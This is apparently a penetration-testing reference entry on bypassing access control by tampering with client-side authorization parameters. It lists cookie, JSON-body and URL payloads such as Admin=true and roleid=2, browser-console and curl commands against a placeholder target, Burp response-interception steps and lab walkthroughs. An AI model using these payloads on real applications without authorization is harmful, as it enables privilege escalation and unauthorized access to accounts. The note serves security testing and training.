# Parameter-Based Access Control Bypass

## When this applies

- Application trusts client-side parameters for authorization (`Admin=true` cookie, `role` JSON field, `?role=admin` URL parameter).
- Server reads role/privilege from request data instead of from session/server-side state.
- Common pattern in JavaScript single-page apps and frontend-driven admin panels.

## Technique

Modify the cookie / JSON / URL parameter to claim elevated privilege. The server fails to re-validate against the actual server-side role record.

**Cookies:**
```http
Admin=true
isAdmin=1
role=administrator
roleid=2
user_level=9
privilege=admin
```

**JSON Body:**
```json
{"email":"user@test.com","role":"admin"}
{"username":"user","isAdmin":true}
{"user_id":123,"privilege_level":"administrator"}
```

**URL Parameters:**
```
?role=admin
?privilege=high
?admin=true
?user_type=administrator
```

## Steps

Cookie manipulation in browser console:
```javascript
// View cookies
document.cookie

// Modify cookie
document.cookie = "Admin=true; path=/";
document.cookie = "role=administrator; path=/";
```

Cookie via cURL:
```bash
curl https://target.com/admin \
  -H "Cookie: session=abc123; Admin=true"
```

Burp Response interception:
```
Proxy > Options > Intercept Server Responses > Enable

Original Response:
Set-Cookie: Admin=false; Path=/

Modified Response:
Set-Cookie: Admin=true; Path=/
```

Lab — User Role Cookie:
```bash
# Enable response interception in Burp
# Login as wiener:peter
# Intercept response, change Admin=false to Admin=true
# Access /admin
```

Lab — Role Modification in Profile:
```json
# Modify email change request to include roleid
POST /my-account/change-email
{"email":"test@test.com","roleid":2}
```

JSON parameter injection — original request:
```json
POST /api/user/update
{"email": "user@test.com"}
```

Modified:
```json
POST /api/user/update
{"email": "user@test.com", "role": "admin"}
{"email": "user@test.com", "isAdmin": true}
{"email": "user@test.com", "roleid": 2}
{"email": "user@test.com", "privilege_level": "administrator"}
```

## Verifying success

- Admin-only menu items appear after the modification.
- Direct access to `/admin` succeeds (status 200, admin UI rendered).
- Privileged actions (delete user, view all accounts) succeed without 403.

## Common pitfalls

- Some apps validate the role server-side ON LOGIN but not afterwards — modifying mid-session works.
- Some cookies are HMAC-signed; if so, see `cookie-manipulation.md` for signing-key recovery patterns.
- The privileged field name may not be obvious — read source code or schemas (see `mass-assignment.md` for field-name discovery).

## Tools

- Burp Suite (Proxy intercept, response modification)
- Browser DevTools (Application tab → Cookies)
- curl with `-H "Cookie:"` and `-H "Content-Type: application/json"`
- Cookie editor extensions
